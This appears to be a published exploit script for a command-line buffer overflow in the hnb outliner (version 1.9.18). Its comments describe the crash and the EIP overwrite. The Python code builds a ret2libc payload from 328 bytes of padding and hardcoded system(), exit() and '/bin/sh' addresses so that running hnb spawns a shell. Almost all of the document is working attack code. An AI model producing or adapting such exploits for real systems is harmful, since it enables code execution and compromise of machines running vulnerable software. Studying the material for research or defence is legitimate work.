#!/usr/bin/python

# Exploit Title: hnb_expl Buffer Overflow
# Date:10-11-2016
# Exploit Author: bitkiller


# Software Link: https://github.com/pld-linux/hnb 
# or a debian repostiries via apt-get


# Contact: jr.overhead@gmail.com
# Category: console applications
 

# 1. Description
# The attacker can execute some code passing a malicous string on the comand line
   
# 2. Proof of Concept
#
# apt-get install hnb
# hnb --version
# hnb 1.9.18
# hnb `perl -e 'print "b" x 328 . "bbbb"'` 

# The EIP is overwrite with bbbb
# Use RETURN INTO LIBC to exploit (ROP) 


# I was use over slackware 10 , that don't give neither GNU Smash Detected and ASLR
#
# Already exists an bug report about hnb , but they use a -rc option wich only crash 
# the software:

# https://www.exploit-db.com/exploits/40025/

# using : hnb `./hnb_expl.y`


########################


#system() function address in the system
SYSTEM_ADDR =  "\xe0\x33\xe0\xb7"

#exit() function address in the system
EXIT_ADDR   =  "\xb0\x61\xdf\xb7"

#address of SHELL = "/bin/sh"
BASH_STRING =  "\x91\xf7\xff\xbf"

#trash until stop in the EIP 


buffer = "a"* 328 


buffer = buffer + SYSTEM_ADDR + EXIT_ADDR + BASH_STRING

print buffer
